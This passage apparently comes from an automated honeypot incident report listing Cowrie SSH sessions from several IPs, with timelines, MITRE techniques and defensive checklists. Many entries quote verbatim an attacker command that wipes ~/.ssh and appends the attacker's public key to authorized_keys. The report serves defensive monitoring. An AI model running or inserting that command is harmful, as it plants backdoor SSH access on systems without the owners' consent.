| **Source IP** | `170.79.37[.]88` |
| **First Seen** | 2026-04-25 12:43 |
| **Last Seen** | 2026-04-25 12:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:43:27` | `cowrie.session.connect` |
| `2026-04-25 12:43:27` | `cowrie.client.version` |
| `2026-04-25 12:43:27` | `cowrie.client.kex` |
| `2026-04-25 12:43:29` | `cowrie.login.success` |
| `2026-04-25 12:43:29` | `cowrie.session.params` |
| `2026-04-25 12:43:29` | `cowrie.command.input` |
| `2026-04-25 12:43:29` | `cowrie.command.failed` |
| `2026-04-25 12:43:30` | `cowrie.log.closed` |
| `2026-04-25 12:43:30` | `cowrie.session.params` |
| `2026-04-25 12:43:30` | `cowrie.command.input` |
| `2026-04-25 12:43:31` | `cowrie.session.file_download` |
| `2026-04-25 12:43:31` | `cowrie.log.closed` |
| `2026-04-25 12:43:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]88` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-475bb53e8799

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]88` |
| **First Seen** | 2026-04-25 12:43 |
| **Last Seen** | 2026-04-25 12:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:43:34` | `cowrie.session.connect` |
| `2026-04-25 12:43:34` | `cowrie.client.version` |
| `2026-04-25 12:43:34` | `cowrie.client.kex` |
| `2026-04-25 12:43:36` | `cowrie.login.success` |
| `2026-04-25 12:43:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]88` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3325a8c4859

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]88` |
| **First Seen** | 2026-04-25 12:43 |
| **Last Seen** | 2026-04-25 12:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:43:55` | `cowrie.session.connect` |
| `2026-04-25 12:43:55` | `cowrie.client.version` |
| `2026-04-25 12:43:55` | `cowrie.client.kex` |
| `2026-04-25 12:43:57` | `cowrie.login.success` |
| `2026-04-25 12:43:57` | `cowrie.session.params` |
| `2026-04-25 12:43:57` | `cowrie.command.input` |
| `2026-04-25 12:43:57` | `cowrie.command.failed` |
| `2026-04-25 12:43:58` | `cowrie.log.closed` |
| `2026-04-25 12:43:58` | `cowrie.session.params` |
| `2026-04-25 12:43:58` | `cowrie.command.input` |
| `2026-04-25 12:43:59` | `cowrie.session.file_download` |
| `2026-04-25 12:43:59` | `cowrie.log.closed` |
| `2026-04-25 12:44:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]88` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21a9e87aa56e

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]88` |
| **First Seen** | 2026-04-25 12:44 |
| **Last Seen** | 2026-04-25 12:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:44:02` | `cowrie.session.connect` |
| `2026-04-25 12:44:02` | `cowrie.client.version` |
| `2026-04-25 12:44:02` | `cowrie.client.kex` |
| `2026-04-25 12:44:04` | `cowrie.login.success` |
| `2026-04-25 12:44:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]88` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f21dcf4a099

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:47 |
| **Last Seen** | 2026-04-25 12:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:47:23` | `cowrie.session.connect` |
| `2026-04-25 12:47:23` | `cowrie.client.version` |
| `2026-04-25 12:47:23` | `cowrie.client.kex` |
| `2026-04-25 12:47:24` | `cowrie.login.success` |
| `2026-04-25 12:47:25` | `cowrie.session.params` |
| `2026-04-25 12:47:25` | `cowrie.command.input` |
| `2026-04-25 12:47:25` | `cowrie.command.failed` |
| `2026-04-25 12:47:25` | `cowrie.log.closed` |
| `2026-04-25 12:47:26` | `cowrie.session.params` |
| `2026-04-25 12:47:26` | `cowrie.command.input` |
| `2026-04-25 12:47:26` | `cowrie.session.file_download` |
| `2026-04-25 12:47:26` | `cowrie.log.closed` |
| `2026-04-25 12:47:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31ce7ebe37d1

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:47 |
| **Last Seen** | 2026-04-25 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:47:30` | `cowrie.session.connect` |
| `2026-04-25 12:47:30` | `cowrie.client.version` |
| `2026-04-25 12:47:30` | `cowrie.client.kex` |
| `2026-04-25 12:47:31` | `cowrie.login.success` |
| `2026-04-25 12:47:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbe985b167df

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:48 |
| **Last Seen** | 2026-04-25 12:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:48:30` | `cowrie.session.connect` |
| `2026-04-25 12:48:30` | `cowrie.client.version` |
| `2026-04-25 12:48:30` | `cowrie.client.kex` |
| `2026-04-25 12:48:31` | `cowrie.login.success` |
| `2026-04-25 12:48:32` | `cowrie.session.params` |
| `2026-04-25 12:48:32` | `cowrie.command.input` |
| `2026-04-25 12:48:32` | `cowrie.command.failed` |
| `2026-04-25 12:48:32` | `cowrie.log.closed` |
| `2026-04-25 12:48:33` | `cowrie.session.params` |
| `2026-04-25 12:48:33` | `cowrie.command.input` |
| `2026-04-25 12:48:33` | `cowrie.session.file_download` |
| `2026-04-25 12:48:33` | `cowrie.log.closed` |
| `2026-04-25 12:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-962f7b3def87

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:48 |
| **Last Seen** | 2026-04-25 12:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:48:37` | `cowrie.session.connect` |
| `2026-04-25 12:48:37` | `cowrie.client.version` |
| `2026-04-25 12:48:37` | `cowrie.client.kex` |
| `2026-04-25 12:48:38` | `cowrie.login.success` |
| `2026-04-25 12:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7878a496cbd

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-04-25 12:50 |
| **Last Seen** | 2026-04-25 12:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:50:12` | `cowrie.session.connect` |
| `2026-04-25 12:50:12` | `cowrie.client.version` |
| `2026-04-25 12:50:12` | `cowrie.client.kex` |
| `2026-04-25 12:50:13` | `cowrie.login.success` |
| `2026-04-25 12:50:13` | `cowrie.session.params` |
| `2026-04-25 12:50:13` | `cowrie.command.input` |
| `2026-04-25 12:50:13` | `cowrie.command.failed` |
| `2026-04-25 12:50:13` | `cowrie.log.closed` |
| `2026-04-25 12:50:13` | `cowrie.session.params` |
| `2026-04-25 12:50:13` | `cowrie.command.input` |
| `2026-04-25 12:50:13` | `cowrie.session.file_download` |
| `2026-04-25 12:50:13` | `cowrie.log.closed` |
| `2026-04-25 12:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0d281421705

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-04-25 12:50 |
| **Last Seen** | 2026-04-25 12:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:50:15` | `cowrie.session.connect` |
| `2026-04-25 12:50:15` | `cowrie.client.version` |
| `2026-04-25 12:50:15` | `cowrie.client.kex` |
| `2026-04-25 12:50:15` | `cowrie.login.success` |
| `2026-04-25 12:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f05998f00ac7

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:50 |
| **Last Seen** | 2026-04-25 12:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:50:38` | `cowrie.session.connect` |
| `2026-04-25 12:50:38` | `cowrie.client.version` |
| `2026-04-25 12:50:39` | `cowrie.client.kex` |
| `2026-04-25 12:50:40` | `cowrie.login.success` |
| `2026-04-25 12:50:41` | `cowrie.session.params` |
| `2026-04-25 12:50:41` | `cowrie.command.input` |
| `2026-04-25 12:50:41` | `cowrie.command.failed` |
| `2026-04-25 12:50:41` | `cowrie.log.closed` |
| `2026-04-25 12:50:42` | `cowrie.session.params` |
| `2026-04-25 12:50:42` | `cowrie.command.input` |
| `2026-04-25 12:50:42` | `cowrie.session.file_download` |
| `2026-04-25 12:50:42` | `cowrie.log.closed` |
| `2026-04-25 12:50:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07699e1b9e81

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:50 |
| **Last Seen** | 2026-04-25 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:50:46` | `cowrie.session.connect` |
| `2026-04-25 12:50:46` | `cowrie.client.version` |
| `2026-04-25 12:50:46` | `cowrie.client.kex` |
| `2026-04-25 12:50:47` | `cowrie.login.success` |
| `2026-04-25 12:50:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39e4155ec297

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-04-25 12:51 |
| **Last Seen** | 2026-04-25 12:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:51:16` | `cowrie.session.connect` |
| `2026-04-25 12:51:16` | `cowrie.client.version` |
| `2026-04-25 12:51:16` | `cowrie.client.kex` |
| `2026-04-25 12:51:16` | `cowrie.login.success` |
| `2026-04-25 12:51:16` | `cowrie.session.params` |
| `2026-04-25 12:51:16` | `cowrie.command.input` |
| `2026-04-25 12:51:16` | `cowrie.command.failed` |
| `2026-04-25 12:51:16` | `cowrie.log.closed` |
| `2026-04-25 12:51:16` | `cowrie.session.params` |
| `2026-04-25 12:51:17` | `cowrie.command.input` |
| `2026-04-25 12:51:17` | `cowrie.session.file_download` |
| `2026-04-25 12:51:17` | `cowrie.log.closed` |
| `2026-04-25 12:51:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7b7ea457167

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-04-25 12:51 |
| **Last Seen** | 2026-04-25 12:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:51:18` | `cowrie.session.connect` |
| `2026-04-25 12:51:18` | `cowrie.client.version` |
| `2026-04-25 12:51:18` | `cowrie.client.kex` |
| `2026-04-25 12:51:18` | `cowrie.login.success` |
| `2026-04-25 12:51:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50e15e455b0f

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-04-25 12:53 |
| **Last Seen** | 2026-04-25 12:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:53:21` | `cowrie.session.connect` |
| `2026-04-25 12:53:21` | `cowrie.client.version` |
| `2026-04-25 12:53:21` | `cowrie.client.kex` |
| `2026-04-25 12:53:22` | `cowrie.login.success` |
| `2026-04-25 12:53:22` | `cowrie.session.params` |
| `2026-04-25 12:53:22` | `cowrie.command.input` |
| `2026-04-25 12:53:22` | `cowrie.command.failed` |
| `2026-04-25 12:53:22` | `cowrie.log.closed` |
| `2026-04-25 12:53:22` | `cowrie.session.params` |
| `2026-04-25 12:53:22` | `cowrie.command.input` |
| `2026-04-25 12:53:22` | `cowrie.session.file_download` |
| `2026-04-25 12:53:22` | `cowrie.log.closed` |
| `2026-04-25 12:53:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-451b57d30cf0

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-04-25 12:53 |
| **Last Seen** | 2026-04-25 12:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:53:24` | `cowrie.session.connect` |
| `2026-04-25 12:53:24` | `cowrie.client.version` |
| `2026-04-25 12:53:24` | `cowrie.client.kex` |
| `2026-04-25 12:53:24` | `cowrie.login.success` |
| `2026-04-25 12:53:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2441139c7668

| Field | Detail |
|---|---|
| **Source IP** | `45.78.198[.]204` |
| **First Seen** | 2026-04-25 12:54 |
| **Last Seen** | 2026-04-25 12:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:54:46` | `cowrie.session.connect` |
| `2026-04-25 12:54:46` | `cowrie.client.version` |
